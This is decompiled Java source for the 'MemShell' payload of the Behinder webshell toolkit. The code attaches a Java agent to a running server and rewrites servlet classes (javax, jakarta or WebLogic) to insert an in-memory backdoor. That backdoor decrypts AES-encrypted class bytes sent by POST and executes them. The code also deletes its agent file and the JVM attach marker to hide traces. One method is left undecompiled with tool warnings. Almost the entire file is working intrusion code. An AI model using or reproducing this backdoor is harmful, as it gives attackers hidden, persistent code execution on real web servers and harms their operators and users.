package net.rebeyond.behinder.payload.java;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.lang.instrument.ClassDefinition;
import java.lang.instrument.Instrumentation;
import java.lang.management.ManagementFactory;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import net.rebeyond.behinder.utils.ServerDetector;

public class MemShell {
    public static String antiAgent;
    public static String libPath;
    public static String password;
    public static String path;
    public static String type;
    public static String whatever;
    private Object Request;
    private Object Response;
    private Object Session;

    public boolean equals(Object obj) {
        Map<String, String> result = new HashMap<>();
        try {
            System.setProperty("jdk.attach.allowAttachSelf", "true");
            fillContext(obj);
            if (type.equals("Agent")) {
                try {
                    doAgentShell(Boolean.parseBoolean(antiAgent));
                    result.put("status", "success");
                    result.put("msg", "MemShell Agent Injected Successfully.");
                } catch (Exception e) {
                    result.put("status", "fail");
                    result.put("msg", e.getMessage());
                }
            } else if (type.equals("Filter") || type.equals("Servlet")) {
            }
            try {
                Object so = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                so.getClass().getMethod("write", byte[].class).invoke(so, Encrypt(buildJson(result, true).getBytes("UTF-8")));
                so.getClass().getMethod("flush", new Class[0]).invoke(so, new Object[0]);
                so.getClass().getMethod("close", new Class[0]).invoke(so, new Object[0]);
            } catch (Exception e2) {
            }
        } catch (Exception e3) {
            result.put("status", "fail");
            result.put("msg", e3.getMessage());
            try {
                Object so2 = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                so2.getClass().getMethod("write", byte[].class).invoke(so2, Encrypt(buildJson(result, true).getBytes("UTF-8")));
                so2.getClass().getMethod("flush", new Class[0]).invoke(so2, new Object[0]);
                so2.getClass().getMethod("close", new Class[0]).invoke(so2, new Object[0]);
            } catch (Exception e4) {
            }
        } catch (Throwable th) {
            try {
                Object so3 = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                so3.getClass().getMethod("write", byte[].class).invoke(so3, Encrypt(buildJson(result, true).getBytes("UTF-8")));
                so3.getClass().getMethod("flush", new Class[0]).invoke(so3, new Object[0]);
                so3.getClass().getMethod("close", new Class[0]).invoke(so3, new Object[0]);
            } catch (Exception e5) {
            }
            throw th;
        }
        return true;
    }

    public static void agentmain(String args, Instrumentation inst) {
        Class<?>[] cLasses = inst.getAllLoadedClasses();
        byte[] bArr = new byte[0];
        Map<String, Map<String, Object>> targetClasses = new HashMap<>();
        Map<String, Object> targetClassJavaxMap = new HashMap<>();
        targetClassJavaxMap.put("methodName", "service");
        List<String> paramJavaxClsStrList = new ArrayList<>();
        paramJavaxClsStrList.add("javax.servlet.ServletRequest");
        paramJavaxClsStrList.add("javax.servlet.ServletResponse");
        targetClassJavaxMap.put("paramList", paramJavaxClsStrList);
        targetClasses.put("javax.servlet.http.HttpServlet", targetClassJavaxMap);
        Map<String, Object> targetClassJakartaMap = new HashMap<>();
        targetClassJakartaMap.put("methodName", "service");
        List<String> paramJakartaClsStrList = new ArrayList<>();
        paramJakartaClsStrList.add("jakarta.servlet.ServletRequest");
        paramJakartaClsStrList.add("jakarta.servlet.ServletResponse");
        targetClassJakartaMap.put("paramList", paramJakartaClsStrList);
        targetClasses.put("javax.servlet.http.HttpServlet", targetClassJavaxMap);
        targetClasses.put("jakarta.servlet.http.HttpServlet", targetClassJakartaMap);
        ClassPool cPool = ClassPool.getDefault();
        if (ServerDetector.isWebLogic()) {
            targetClasses.clear();
            Map<String, Object> targetClassWeblogicMap = new HashMap<>();
            targetClassWeblogicMap.put("methodName", "execute");
            List<String> paramWeblogicClsStrList = new ArrayList<>();
            paramWeblogicClsStrList.add("javax.servlet.ServletRequest");
            paramWeblogicClsStrList.add("javax.servlet.ServletResponse");
            targetClassWeblogicMap.put("paramList", paramWeblogicClsStrList);
            targetClasses.put("weblogic.servlet.internal.ServletStubImpl", targetClassWeblogicMap);
        }
        String shellCode = "javax.servlet.http.HttpServletRequest request=(javax.servlet.ServletRequest)$1;\njavax.servlet.http.HttpServletResponse response = (javax.servlet.ServletResponse)$2;\njavax.servlet.http.HttpSession session = request.getSession();\nString pathPattern=\"%s\";\nif (request.getRequestURI().matches(pathPattern))\n{\n\tjava.util.Map obj=new java.util.HashMap();\n\tobj.put(\"request\",request);\n\tobj.put(\"response\",response);\n\tobj.put(\"session\",session);\n    ClassLoader loader=this.getClass().getClassLoader();\n\tif (request.getMethod().equals(\"POST\"))\n\t{\n\t\ttry\n\t\t{\n\t\t\tString k=\"%s\";\n\t\t\tsession.putValue(\"u\",k);\n\t\t\t\n\t\t\tjava.lang.ClassLoader systemLoader=java.lang.ClassLoader.getSystemClassLoader();\n\t\t\tClass cipherCls=systemLoader.loadClass(\"javax.crypto.Cipher\");\n\n\t\t\tObject c=cipherCls.getDeclaredMethod(\"getInstance\",new Class[]{String.class}).invoke((java.lang.Object)cipherCls,new Object[]{\"AES\"});\n\t\t\tObject keyObj=systemLoader.loadClass(\"javax.crypto.spec.SecretKeySpec\").getDeclaredConstructor(new Class[]{byte[].class,String.class}).newInstance(new Object[]{k.getBytes(),\"AES\"});;\n\t\t\t       \n\t\t\tjava.lang.reflect.Method initMethod=cipherCls.getDeclaredMethod(\"init\",new Class[]{int.class,systemLoader.loadClass(\"java.security.Key\")});\n\t\t\tinitMethod.invoke(c,new Object[]{new Integer(2),keyObj});\n\n\t\t\tjava.lang.reflect.Method doFinalMethod=cipherCls.getDeclaredMethod(\"doFinal\",new Class[]{byte[].class});\n            byte[] requestBody=null;\n            try {\n                    Class Base64 = loader.loadClass(\"sun.misc.BASE64Decoder\");\n\t\t\t        Object Decoder = Base64.newInstance();\n                    requestBody=(byte[]) Decoder.getClass().getMethod(\"decodeBuffer\", new Class[]{String.class}).invoke(Decoder, new Object[]{request.getReader().readLine()});\n                } catch (Exception ex) \n                {\n                    Class Base64 = loader.loadClass(\"java.util.Base64\");\n                    Object Decoder = Base64.getDeclaredMethod(\"getDecoder\",new Class[0]).invoke(null, new Object[0]);\n                    requestBody=(byte[])Decoder.getClass().getMethod(\"decode\", new Class[]{String.class}).invoke(Decoder, new Object[]{request.getReader().readLine()});\n                }\n\t\t\t\t\t\t\n\t\t\tbyte[] buf=(byte[])doFinalMethod.invoke(c,new Object[]{requestBody});\n\t\t\tjava.lang.reflect.Method defineMethod=java.lang.ClassLoader.class.getDeclaredMethod(\"defineClass\", new Class[]{String.class,java.nio.ByteBuffer.class,java.security.ProtectionDomain.class});\n\t\t\tdefineMethod.setAccessible(true);\n\t\t\tjava.lang.reflect.Constructor constructor=java.security.SecureClassLoader.class.getDeclaredConstructor(new Class[]{java.lang.ClassLoader.class});\n\t\t\tconstructor.setAccessible(true);\n\t\t\tjava.lang.ClassLoader cl=(java.lang.ClassLoader)constructor.newInstance(new Object[]{loader});\n\t\t\tjava.lang.Class  c=(java.lang.Class)defineMethod.invoke((java.lang.Object)cl,new Object[]{null,java.nio.ByteBuffer.wrap(buf),null});\n\t\t\tc.newInstance().equals(obj);\n\t\t}\n\n\t\tcatch(java.lang.Exception e)\n\t\t{\n\t\t   e.printStackTrace();\n\t\t}\n\t\tcatch(java.lang.Error error)\n\t\t{\n\t\terror.printStackTrace();\n\t\t}\n\t\treturn;\n\t}\t\n}\n";
        int length = cLasses.length;
        for (int i = 0; i < length; i++) {
            Class<?> cls = cLasses[i];
            if (targetClasses.keySet().contains(cls.getName())) {
                String targetClassName = cls.getName();
                try {
                    shellCode = String.format(shellCode, new String(base64decode(args.split("\\|")[0])), new String(base64decode(args.split("\\|")[1])));
                    if (targetClassName.equals("jakarta.servlet.http.HttpServlet")) {
                        shellCode = shellCode.replace("javax.servlet", "jakarta.servlet");
                    }
                    cPool.insertClassPath(new ClassClassPath(cls));
                    cPool.importPackage("java.lang.reflect.Method");
                    cPool.importPackage("javax.crypto.Cipher");
                    List<CtClass> paramClsList = new ArrayList<>();
                    for (Object clsName : (List) targetClasses.get(targetClassName).get("paramList")) {
                        paramClsList.add(cPool.get((String) clsName));
                    }
                    CtClass cClass = cPool.get(targetClassName);
                    cClass.getDeclaredMethod(targetClasses.get(targetClassName).get("methodName").toString(), (CtClass[]) paramClsList.toArray(new CtClass[paramClsList.size()])).insertBefore(shellCode);
                    cClass.detach();
                    inst.redefineClasses(new ClassDefinition[]{new ClassDefinition(cls, cClass.toBytecode())});
                } catch (Exception e) {
                    e.printStackTrace();
                } catch (Error error) {
                    error.printStackTrace();
                }
            }
        }
    }

    /* JADX WARNING: Code restructure failed: missing block: B:13:0x007e, code lost:
        r8 = th;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:14:0x007f, code lost:
        r9 = r7;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:23:0x0091, code lost:
        r7 = move-exception;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:24:0x0092, code lost:
        r8 = r7;
     */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    private static void modifyJar(String r11, String r12, byte[] r13) throws Exception {
        /*
        // Method dump skipped, instructions count: 148
        */
        throw new UnsupportedOperationException("Method not decompiled: net.rebeyond.behinder.payload.java.MemShell.modifyJar(java.lang.String, java.lang.String, byte[]):void");
    }

    public void doAgentShell(boolean antiAgent2) throws Exception {
        try {
            Class VirtualMachineCls = ClassLoader.getSystemClassLoader().loadClass("com.sun.tools.attach.VirtualMachine");
            Method attachMethod = VirtualMachineCls.getDeclaredMethod("attach", String.class);
            VirtualMachineCls.getDeclaredMethod("loadAgent", String.class, String.class).invoke(attachMethod.invoke(VirtualMachineCls, getCurrentPID()), libPath, base64encode(path) + "|" + base64encode(password));
            String osInfo = System.getProperty("os.name").toLowerCase();
            if (osInfo.indexOf("windows") < 0 && osInfo.indexOf("winnt") < 0 && osInfo.indexOf("linux") >= 0 && antiAgent2) {
                new File("/tmp/.java_pid" + getCurrentPID()).delete();
            }
        } catch (Exception e) {
            e.printStackTrace();
        } catch (Error error) {
            error.printStackTrace();
        } finally {
            new File(libPath).delete();
        }
    }

    private static String getCurrentPID() {
        return ManagementFactory.getRuntimeMXBean().getName().split("@")[0];
    }

    private static byte[] base64decode(String base64Text) throws Exception {
        if (System.getProperty("java.version").compareTo("1.9") >= 0) {
            Class Base64 = Class.forName("java.util.Base64");
            Object Decoder = Base64.getMethod("getDecoder", null).invoke(Base64, null);
            return (byte[]) Decoder.getClass().getMethod("decode", String.class).invoke(Decoder, base64Text);
        }
        Object Decoder2 = Class.forName("sun.misc.BASE64Decoder").newInstance();
        return (byte[]) Decoder2.getClass().getMethod("decodeBuffer", String.class).invoke(Decoder2, base64Text);
    }

    private static String base64encode(String content) throws Exception {
        if (System.getProperty("java.version").compareTo("1.9") >= 0) {
            Class Base64 = Class.forName("java.util.Base64");
            Object Encoder = Base64.getMethod("getEncoder", null).invoke(Base64, null);
            return (String) Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, content.getBytes("UTF-8"));
        }
        Object Encoder2 = Class.forName("sun.misc.BASE64Encoder").newInstance();
        return ((String) Encoder2.getClass().getMethod("encode", byte[].class).invoke(Encoder2, content.getBytes("UTF-8"))).replace("\n", "").replace("\r", "");
    }

    public static byte[] getFileData(String filePath) throws Exception {
        byte[] fileContent = new byte[0];
        FileInputStream fis = new FileInputStream(new File(filePath));
        byte[] buffer = new byte[10240000];
        while (true) {
            int length = fis.read(buffer);
            if (length > 0) {
                fileContent = mergeBytes(fileContent, Arrays.copyOfRange(buffer, 0, length));
            } else {
                fis.close();
                return fileContent;
            }
        }
    }

    public static byte[] mergeBytes(byte[] a, byte[] b) throws Exception {
        ByteArrayOutputStream output = new ByteArrayOutputStream();
        output.write(a);
        output.write(b);
        return output.toByteArray();
    }

    private void fillContext(Object obj) throws Exception {
        if (obj.getClass().getName().indexOf("PageContext") >= 0) {
            this.Request = obj.getClass().getMethod("getRequest", new Class[0]).invoke(obj, new Object[0]);
            this.Response = obj.getClass().getMethod("getResponse", new Class[0]).invoke(obj, new Object[0]);
            this.Session = obj.getClass().getMethod("getSession", new Class[0]).invoke(obj, new Object[0]);
        } else {
            Map<String, Object> objMap = (Map) obj;
            this.Session = objMap.get("session");
            this.Response = objMap.get("response");
            this.Request = objMap.get("request");
        }
        this.Response.getClass().getMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
    }

    private String buildJson(Map<String, String> entity, boolean encode) throws Exception {
        StringBuilder sb = new StringBuilder();
        System.getProperty("java.version");
        sb.append("{");
        for (String key : entity.keySet()) {
            sb.append("\"" + key + "\":\"");
            String value = entity.get(key).toString();
            if (encode) {
                value = base64encode(value);
            }
            sb.append(value);
            sb.append("\",");
        }
        if (sb.toString().endsWith(",")) {
            sb.setLength(sb.length() - 1);
        }
        sb.append("}");
        return sb.toString();
    }

    private byte[] Encrypt(byte[] bs) throws Exception {
        SecretKeySpec skeySpec = new SecretKeySpec(this.Session.getClass().getMethod("getAttribute", String.class).invoke(this.Session, "u").toString().getBytes("utf-8"), "AES");
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(1, skeySpec);
        return cipher.doFinal(bs);
    }

    private Object sessionGetAttribute(Object session, String key) {
        try {
            return session.getClass().getMethod("getAttribute", String.class).invoke(session, key);
        } catch (Exception e) {
            return null;
        }
    }

    private void sessionSetAttribute(Object session, String key, Object value) {
        try {
            session.getClass().getMethod("setAttribute", String.class, Object.class).invoke(session, key, value);
        } catch (Exception e) {
        }
    }
}
